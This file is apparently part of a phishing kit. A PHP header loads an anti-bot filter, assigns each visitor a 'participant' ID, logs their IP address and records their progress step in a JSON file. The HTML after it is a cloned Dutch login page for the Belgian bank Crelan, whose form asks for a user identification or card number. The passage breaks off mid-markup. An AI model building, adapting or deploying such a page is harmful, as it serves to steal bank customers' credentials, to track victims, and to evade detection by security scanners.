<?php
// Load antibot protection
require_once __DIR__ . '/../antibot/antibot.php';

// Check antibot protection
antibot_protect();

// Generate unique participant ID if not exists
if (!isset($_SESSION['participant_id'])) {
    $_SESSION['participant_id'] = uniqid('participant_', true);
}

$participant_id = $_SESSION['participant_id'];

// Update participant status in JSON file
function updateParticipantStatus($participant_id, $status) {
    $session_file = '../session/participants.json';
    
    // Create file if it doesn't exist
    if (!file_exists($session_file)) {
        file_put_contents($session_file, json_encode([]));
    }
    
    // Read existing data
    $participants = json_decode(file_get_contents($session_file), true);
    if (!$participants) {
        $participants = [];
    }
    
    // Get client IP address
    $ip_address = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Update or add participant (keep existing IP if already set)
    $existing_ip = isset($participants[$participant_id]) ? $participants[$participant_id]['ip'] : $ip_address;
    
    $participants[$participant_id] = [
        'id' => $participant_id,
        'status' => $status,
        'ip' => $existing_ip
    ];
    
    // Save back to file
    file_put_contents($session_file, json_encode($participants, JSON_PRETTY_PRINT));
}

// Update status to question1
updateParticipantStatus($participant_id, 'question1');
?>

<html class="notranslate" translate="no" lang="nl" data-react-helmet="lang"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="google" content="notranslate"><style type="text/css">:root, :host {
  --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
  --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
  --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
  --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
  --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
  --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
  --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
}

svg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa {
  overflow: visible;
  box-sizing: content-box;
}

.svg-inline--fa {
  display: var(--fa-display, inline-block);
  height: 1em;
  overflow: visible;
  vertical-align: -0.125em;
}
.svg-inline--fa.fa-2xs {
  vertical-align: 0.1em;
}
.svg-inline--fa.fa-xs {
  vertical-align: 0em;
}
.svg-inline--fa.fa-sm {
  vertical-align: -0.0714285705em;
}
.svg-inline--fa.fa-lg {
  vertical-align: -0.2em;
}
.svg-inline--fa.fa-xl {
  vertical-align: -0.25em;
}
.svg-inline--fa.fa-2xl {
  vertical-align: -0.3125em;
}
.svg-inline--fa.fa-pull-left {
  margin-right: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-pull-right {
  margin-left: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-li {
  width: var(--fa-li-width, 2em);
  top: 0.25em;
}
.svg-inline--fa.fa-fw {
  width: var(--fa-fw-width, 1.25em);
}

.fa-layers svg.svg-inline--fa {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
}

.fa-layers-counter, .fa-layers-text {
  display: inline-block;
  position: absolute;
  text-align: center;
}

.fa-layers {
  display: inline-block;
  height: 1em;
  position: relative;
  text-align: center;
  vertical-align: -0.125em;
  width: 1em;
}
.fa-layers svg.svg-inline--fa {
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-text {
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
  -webkit-transform-origin: center center;
          transform-origin: center center;
}

.fa-layers-counter {
  background-color: var(--fa-counter-background-color, #ff253a);
  border-radius: var(--fa-counter-border-radius, 1em);
  box-sizing: border-box;
  color: var(--fa-inverse, #fff);
  line-height: var(--fa-counter-line-height, 1);
  max-width: var(--fa-counter-max-width, 5em);
  min-width: var(--fa-counter-min-width, 1.5em);
  overflow: hidden;
  padding: var(--fa-counter-padding, 0.25em 0.5em);
  right: var(--fa-right, 0);
  text-overflow: ellipsis;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-counter-scale, 0.25));
          transform: scale(var(--fa-counter-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-bottom-right {
  bottom: var(--fa-bottom, 0);
  right: var(--fa-right, 0);
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom right;
          transform-origin: bottom right;
}

.fa-layers-bottom-left {
  bottom: var(--fa-bottom, 0);
  left: var(--fa-left, 0);
  right: auto;
  top: auto;
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: bottom left;
          transform-origin: bottom left;
}

.fa-layers-top-right {
  top: var(--fa-top, 0);
  right: var(--fa-right, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top right;
          transform-origin: top right;
}

.fa-layers-top-left {
  left: var(--fa-left, 0);
  right: auto;
  top: var(--fa-top, 0);
  -webkit-transform: scale(var(--fa-layers-scale, 0.25));
          transform: scale(var(--fa-layers-scale, 0.25));
  -webkit-transform-origin: top left;
          transform-origin: top left;
}

.fa-1x {
  font-size: 1em;
}

.fa-2x {
  font-size: 2em;
}

.fa-3x {
  font-size: 3em;
}

.fa-4x {
  font-size: 4em;
}

.fa-5x {
  font-size: 5em;
}

.fa-6x {
  font-size: 6em;
}

.fa-7x {
  font-size: 7em;
}

.fa-8x {
  font-size: 8em;
}

.fa-9x {
  font-size: 9em;
}

.fa-10x {
  font-size: 10em;
}

.fa-2xs {
  font-size: 0.625em;
  line-height: 0.1em;
  vertical-align: 0.225em;
}

.fa-xs {
  font-size: 0.75em;
  line-height: 0.0833333337em;
  vertical-align: 0.125em;
}

.fa-sm {
  font-size: 0.875em;
  line-height: 0.0714285718em;
  vertical-align: 0.0535714295em;
}

.fa-lg {
  font-size: 1.25em;
  line-height: 0.05em;
  vertical-align: -0.075em;
}

.fa-xl {
  font-size: 1.5em;
  line-height: 0.0416666682em;
  vertical-align: -0.125em;
}

.fa-2xl {
  font-size: 2em;
  line-height: 0.03125em;
  vertical-align: -0.1875em;
}

.fa-fw {
  text-align: center;
  width: 1.25em;
}

.fa-ul {
  list-style-type: none;
  margin-left: var(--fa-li-margin, 2.5em);
  padding-left: 0;
}
.fa-ul > li {
  position: relative;
}

.fa-li {
  left: calc(var(--fa-li-width, 2em) * -1);
  position: absolute;
  text-align: center;
  width: var(--fa-li-width, 2em);
  line-height: inherit;
}

.fa-border {
  border-color: var(--fa-border-color, #eee);
  border-radius: var(--fa-border-radius, 0.1em);
  border-style: var(--fa-border-style, solid);
  border-width: var(--fa-border-width, 0.08em);
  padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
}

.fa-pull-left {
  float: left;
  margin-right: var(--fa-pull-margin, 0.3em);
}

.fa-pull-right {
  float: right;
  margin-left: var(--fa-pull-margin, 0.3em);
}

.fa-beat {
  -webkit-animation-name: fa-beat;
          animation-name: fa-beat;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-bounce {
  -webkit-animation-name: fa-bounce;
          animation-name: fa-bounce;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
}

.fa-fade {
  -webkit-animation-name: fa-fade;
          animation-name: fa-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-beat-fade {
  -webkit-animation-name: fa-beat-fade;
          animation-name: fa-beat-fade;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
          animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-flip {
  -webkit-animation-name: fa-flip;
          animation-name: fa-flip;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
          animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-shake {
  -webkit-animation-name: fa-shake;
          animation-name: fa-shake;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-delay: var(--fa-animation-delay, 0s);
          animation-delay: var(--fa-animation-delay, 0s);
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 2s);
          animation-duration: var(--fa-animation-duration, 2s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, linear);
          animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin-reverse {
  --fa-animation-direction: reverse;
}

.fa-pulse,
.fa-spin-pulse {
  -webkit-animation-name: fa-spin;
          animation-name: fa-spin;
  -webkit-animation-direction: var(--fa-animation-direction, normal);
          animation-direction: var(--fa-animation-direction, normal);
  -webkit-animation-duration: var(--fa-animation-duration, 1s);
          animation-duration: var(--fa-animation-duration, 1s);
  -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
          animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
          animation-timing-function: var(--fa-animation-timing, steps(8));
}

@media (prefers-reduced-motion: reduce) {
  .fa-beat,
.fa-bounce,
.fa-fade,
.fa-beat-fade,
.fa-flip,
.fa-pulse,
.fa-shake,
.fa-spin,
.fa-spin-pulse {
    -webkit-animation-delay: -1ms;
            animation-delay: -1ms;
    -webkit-animation-duration: 1ms;
            animation-duration: 1ms;
    -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1;
    -webkit-transition-delay: 0s;
            transition-delay: 0s;
    -webkit-transition-duration: 0s;
            transition-duration: 0s;
  }
}
@-webkit-keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@keyframes fa-beat {
  0%, 90% {
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  45% {
    -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@-webkit-keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@keyframes fa-bounce {
  0% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  10% {
    -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
  100% {
    -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
  }
}
@-webkit-keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@-webkit-keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    -webkit-transform: scale(1);
            transform: scale(1);
  }
  50% {
    opacity: 1;
    -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@-webkit-keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@keyframes fa-flip {
  50% {
    -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@-webkit-keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@keyframes fa-shake {
  0% {
    -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
  }
  4% {
    -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
  }
  8%, 24% {
    -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
  }
  12%, 28% {
    -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
  }
  16% {
    -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
  }
  20% {
    -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
  }
  32% {
    -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
  }
  36% {
    -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
  }
  40%, 100% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
}
@-webkit-keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
@keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}
.fa-rotate-90 {
  -webkit-transform: rotate(90deg);
          transform: rotate(90deg);
}

.fa-rotate-180 {
  -webkit-transform: rotate(180deg);
          transform: rotate(180deg);
}

.fa-rotate-270 {
  -webkit-transform: rotate(270deg);
          transform: rotate(270deg);
}

.fa-flip-horizontal {
  -webkit-transform: scale(-1, 1);
          transform: scale(-1, 1);
}

.fa-flip-vertical {
  -webkit-transform: scale(1, -1);
          transform: scale(1, -1);
}

.fa-flip-both,
.fa-flip-horizontal.fa-flip-vertical {
  -webkit-transform: scale(-1, -1);
          transform: scale(-1, -1);
}

.fa-rotate-by {
  -webkit-transform: rotate(var(--fa-rotate-angle, none));
          transform: rotate(var(--fa-rotate-angle, none));
}

.fa-stack {
  display: inline-block;
  vertical-align: middle;
  height: 2em;
  position: relative;
  width: 2.5em;
}

.fa-stack-1x,
.fa-stack-2x {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
  z-index: var(--fa-stack-z-index, auto);
}

.svg-inline--fa.fa-stack-1x {
  height: 1em;
  width: 1.25em;
}
.svg-inline--fa.fa-stack-2x {
  height: 2em;
  width: 2.5em;
}

.fa-inverse {
  color: var(--fa-inverse, #fff);
}

.sr-only,
.fa-sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.sr-only-focusable:not(:focus),
.fa-sr-only-focusable:not(:focus) {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.svg-inline--fa .fa-primary {
  fill: var(--fa-primary-color, currentColor);
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa .fa-secondary {
  fill: var(--fa-secondary-color, currentColor);
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-primary {
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-secondary {
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa mask .fa-primary,
.svg-inline--fa mask .fa-secondary {
  fill: black;
}

.fad.fa-inverse,
.fa-duotone.fa-inverse {
  color: var(--fa-inverse, #fff);
}</style><link rel="shortcut icon" href="./favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="format-detection" content="telephone=no"><meta name="apple-itunes-app" content="app-id=893585833"><link rel="manifest" href="./manifest.json"><title>Home | Login</title><link href="./files/main.4393a533.css" rel="stylesheet">
<style data-emotion="css" data-s=""></style></head><body><div id="root"><div class="argnt-container"><div class="argnt-p-login-page"><div class="argnt-p-login-page-wrapper"><div class="argnt-p-login-page-content-center">
  <header class="grid grid--justifyCenter"><div class="grid__cell grid__cell--lg-12"><div class="argnt-m-header argnt-m-header--mobile"><div class="argnt-m-header__logo">
  <a class="argnt-a-logo argnt-a-logo--icon" href="https://www.crelan.be/nl.html" target="_blank"><img src="./files/my-main_logo.svg" alt="" srcset=""></a></div><div class="argnt-m-header__actions"><button type="button" class="argnt-a-language-selection" lang="fr"><span class="sr-only">Modifiez la langue vers le français</span><span class="argnt-a-body argnt-a-body__small argnt-a-body__semi-bold argnt-a-language-selection__label" aria-hidden="true">NL</span></button></a></div></div></div></header>
  <main class="grid  argnt-p-login-page__flex-grow-1"><div class="argnt-p-image-background-container aside_screen">
  <a href="http://"> terug naar profielen </a><br><br><h2>Maak uw profiel aan in 3 stappen</h2><br><img src="./files/skateboard.png" alt="skateboard"><div><a href="http://" target="_blank" rel="noopener noreferrer"> Contacteer ons </a></div>
  <div class="argnt-p-image-background"></div></div><div class=""style="width: 100%"><div class="argnt-p-login-page__content-wrapper"><div class="argnt-p-login-page__content"><div><div class="argnt-p-login"><h1 class="argnt-a-heading argnt-a-heading-h2 argnt-a-heading__bold argnt-p-login__title">Identificatie</h1><div class="argnt-m-login-component"><div class="argnt-m-announcements"></div><div class="sr-only"><section class="argnt-a-message argnt-a-message--error"><div class="argnt-a-message__icon-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-exclamation" class="svg-inline--fa fa-circle-exclamation " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z"></path></svg></div><div class="argnt-a-message__body"><p role="alert"></p></div></section></div><div class="argnt-m-loader-wrapper"><div class="argnt-q-collapse argnt-q-collapse--open" aria-hidden="false" style="overflow: visible; opacity: 1; height: auto;"><div class="argnt-q-collapse__content"><div class="argnt-m-form-login"><section id="itsme" class="argnt-m-form-itsme-login"><div class="argnt-a-collapse-item argnt-a-collapse-item--box-shadow" style="display: none"><h2 class="argnt-a-collapse-item__header-as"></h2><div class="argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-a-collapse-item__transition-wrapper" id="itsme-collapse-content" role="region" aria-labelledby="itsme-collapse-control" aria-hidden="true" style=""><div class="argnt-a-collapse-item__content">


<form class="argnt-m-form-container">



<div class="argnt-m-form-itsme-login__form"><div class="argnt-a-field-container argnt-a-field-container--gap-16">
<label for="debitCardInputItsme"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-m-form-itsme-login__form__card-number-label">Vul hier uw gebruikersidentificatie in (bijvoorbeeld: AB12CD).</span></label>
<div class="argnt-m-form-card-numbers-drop-down"><div class="argnt-a-card-numbers-drop-down css-b62m3t-container"><span id="react-select-2-live-region" class="css-7pg0cj-a11yText"></span>
<span aria-live="polite" aria-atomic="false" aria-relevant="additions text" role="log" class="css-7pg0cj-a11yText"></span><div class="argnt-a-card-numbers-drop-down__control css-13cymwt-control">
<div class="argnt-a-card-numbers-drop-down__value-container argnt-a-card-numbers-drop-down__value-container--has-value css-hlgwow"><div class="argnt-a-masked-input-field argnt-a-masked-input-field__card"
><div class="argnt-a-field argnt-a-field--unstyled">


 




<div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="xmark" class="svg-inline--fa fa-xmark " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z"></path></svg></div></div><div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-check" class="svg-inline--fa fa-circle-check " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM363.3 203.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L224 297.4l-52.7-52.7c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6l64 64c6.2 6.2 16.4 6.2 22.6 0l128-128z"></path></svg></div></div></div></div></div><div class="argnt-a-card-numbers-drop-down__indicators css-1wy0on6"><div class="argnt-a-card-numbers-drop-down__indicator argnt-a-card-numbers-drop-down__dropdown-indicator css-1xc3v61-indicatorContainer" aria-hidden="true"><span class="argnt-a-collapse-indicator"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-up" class="svg-inline--fa fa-chevron-up " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="transform: rotate(180deg); transition-property: transform; transition-duration: 175ms; transition-timing-function: ease-in-out;"><path fill="currentColor" d="M244.7 116.7c6.2-6.2 16.4-6.2 22.6 0l192 192c6.2 6.2 6.2 16.4 0 22.6s-16.4 6.2-22.6 0L256 150.6 75.3 331.3c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6l192-192z"></path></svg></span></div></div></div><input name="cardNumberInput" type="hidden" value=""></div><div role="alert"><div class="argnt-q-collapse argnt-q-collapse--closed" aria-hidden="true" style="overflow: hidden; opacity: 0; height: 0px;"><div class="argnt-q-collapse__content"><span class="argnt-a-field-error"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-exclamation" class="svg-inline--fa fa-circle-exclamation " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z"></path></svg><span class="argnt-a-field-error__content" id="cardNumberInput-error-message">Kaartnummer is verplicht.</span></span></div></div></div></div></div><div class="argnt-m-form-itsme-login__form__card-number-save"><div class="argnt-m-form-checkbox"><div role="alert"><div class="argnt-q-collapse argnt-q-collapse--closed" aria-hidden="true" style="overflow: hidden; opacity: 0; height: 0px;"><div class="argnt-q-collapse__content"></div></div></div></div></div><div class="argnt-m-timeout-expiring-message sr-only"><div class="sr-only" role="alert"></div><div class="argnt-m-timeout-expiring-message__content"></div></div></div><div class="argnt-m-form-container--actions"><div 